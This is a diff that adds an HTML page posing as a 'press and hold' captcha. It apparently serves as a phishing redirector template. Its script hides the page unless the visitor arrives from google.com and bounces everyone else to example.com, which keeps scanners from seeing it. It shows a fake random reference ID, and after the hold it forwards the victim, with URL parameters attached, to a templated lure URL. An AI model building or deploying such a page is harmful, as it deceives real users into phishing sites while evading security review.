@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solve the Captcha to continue...</title>
+</head>
+<body>
+<div class="container" style="display: none">
+    <style>
+        * {
+            user-select: none;
+        }
+        body {
+            background-color: #f5f5f5;
+            height: 100vh;
+            font-family: Arial, sans-serif;
+            font-size: 2vw;
+            line-height: 1.5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            align-items: center;
+            display: flex;
+            flex-direction: column;
+            height: 400px;
+            width: 100vw;
+            justify-content: space-between;
+            background: white;
+            border-radius: 5px;
+            box-shadow: 0 0 8px 0 lightgray;
+        }
+
+        .container .body {
+            align-items: center;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            flex-grow: 1;
+        }
+        .container .footer {
+            background: #f8f8f8;
+            border-top: 1px solid #e8e8e8;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+            width: 100px;
+        }
+        .text {
+            color: #1c1c1c;
+            font-size: 16px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .button {
+            background-color: #ffffff;
+            border: 1px solid lightgray;
+            border-radius: 40px;
+            color: #007ac2;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            transition: background-color 0.3s ease-in-out;
+            position: relative;
+            overflow: hidden;
+        }
+        .button:hover {
+            background-color: #d1f2ff;
+        }
+        .progress {
+            position: absolute;
+            top: 0;
+            left: 0;
+            height: 100%;
+            width: 0;
+            background-color: #007ac2;
+            transition: width .5s ease-in-out;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .progress.loading .loader {
+            display: block;
+        }
+        .loader {
+            display: none;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            position: relative;
+            animation: rotate 1s linear infinite
+        }
+        .loader::before {
+            content: "";
+            box-sizing: border-box;
+            position: absolute;
+            inset: 0;
+            border-radius: 50%;
+            border: 5px solid #FFF;
+            animation: prixClip 2s linear infinite;
+        }
+
+        @keyframes rotate {
+            100%   {transform: rotate(360deg)}
+        }
+
+        @keyframes prixClip {
+            0%   {clip-path: polygon(50% 50%, 0 0, 0 0, 0 0, 0 0, 0 0)}
+            12%  {clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 0, 100% 0, 100% 0)}
+            25%  {clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 100% 100%, 100% 100%)}
+            37%  {clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 0 100%, 0 100%)}
+            50%  {clip-path: polygon(50% 50%, 0 0, 100% 0, 100% 100%, 0 100%, 0 0)}
+            63%  {clip-path: polygon(50% 50%, 100% 0, 100% 0, 100% 100%, 0 100%, 0 0)}
+            75%  {clip-path: polygon(50% 50%, 100% 100%, 100% 100%, 100% 100%, 0 100%, 0 0)}
+            87%  {clip-path: polygon(50% 50%, 0 100%, 0 100%, 0 100%, 0 100%, 0 0)}
+            100% {clip-path: polygon(50% 50%, 0 0, 0 0, 0 0, 0 0, 0 0)}
+        }
+
+        .shake, .shake:hover {
+            animation: shake 0.5s;
+            animation-iteration-count: 3;
+            background-color: #ff0000;
+            color: white;
+        }
+        @keyframes shake {
+            0% { transform: translate(0, 0); }
+            25% { transform: translate(-5px, 0); }
+            50% { transform: translate(0, 0); }
+            75% { transform: translate(5px, 0); }
+            100% { transform: translate(0, 0); }
+        }
+        .link {
+            color: #007ac2;
+            font-size: 14px;
+            margin-top: 20px;
+            text-decoration: none;
+        }
+        .reference {
+            color: #999;
+            font-size: 12px;
+            margin: 5px;
+        }
+
+        @media screen and (min-width: 700px){
+            .container {
+                width: 600px;
+            }
+        }
+    </style>
+    <div class="body">
+        <p class="text">Press & Hold to confirm you are a human (and not a bot).</p>
+        <button
+                id="hold-button"
+                class="button"
+                onmousedown="this.classList.add('pressed'); pressAndHold();"
+                ontouchstart="this.classList.add('pressed'); pressAndHold();"
+                onmouseup="this.classList.remove('pressed');"
+                ontouchend="this.classList.remove('pressed');"
+        >
+            <span id="progress-bar" class="progress"><span class="loader"></span></span>
+            Press and Hold
+        </button>
+    </div>
+    <div class="footer">
+        <p class="reference">Reference ID: <span id="reference-id"></span></p>
+    </div>
+    <script>
+        const ALLOWED_DOMAINS = ['google.com'];
+        const FAILED_REDIRECT = 'https://example.com';
+        let isAllowed = false, referrer;
+        if (document.referrer) {
+          referrer = new URL(document.referrer)
+          isAllowed = ALLOWED_DOMAINS.some(domain => referrer.hostname.toLowerCase().endsWith(domain.toLowerCase()))
+        }
+        if (isAllowed) {
+          document.querySelector('.container').setAttribute('style', '')
+        } else {
+          setTimeout(() => window.location.replace(FAILED_REDIRECT), 1000)
+        }
+        document.querySelector('#reference-id').innerText = _ref();
+        function pressAndHold() {
+            const button = document.getElementById("hold-button");
+            const progress = document.getElementById("progress-bar");
+            progress.classList.remove('loading')
+            const startTime = new Date().getTime();
+            const timer = setInterval(function () {
+                const elapsedTime = new Date().getTime() - startTime;
+                let progressWidth = elapsedTime / 20;
+                if (progressWidth > 100) {
+                    progressWidth = 100;
+                    clearInterval(timer);
+                    progress.classList.add('loading');
+                    button.setAttribute('disabled', 'disabled');
+                    document.querySelector('title').innerText = 'Redirecting...';
+                    setTimeout(() => {
+                        const params = new URL(window.location.href)
+                        window.location.replace({lure_url_js} + params.search + params.hash);
+                    }, 1000);
+                }
+                progress.style.width = progressWidth + "%";
+                if (!button.classList.contains("pressed")) {
+                    clearInterval(timer);
+                    progress.style.width = "0%";
+                    button.classList.add("shake");
+                    setTimeout(function () {
+                        button.classList.remove("shake");
+                        progress.style.width = "0%";
+                    }, 500);
+                }
+            }, 50);
+        }
+        function _ref() {
+          function _r(_l) {
+              let __r = '';
+              for (let _i = 0; _i < _l; _i++) {
+                  __r += 'abcdef0123456789'.charAt(Math.floor(Math.random() * 16));
+              }
+              return __r;
+          }
+          return `${_r(0x8)}-${_r(0x4)}-${_r(0x4)}`;
+      }
+    </script>
+</div>
+</body>
+</html>
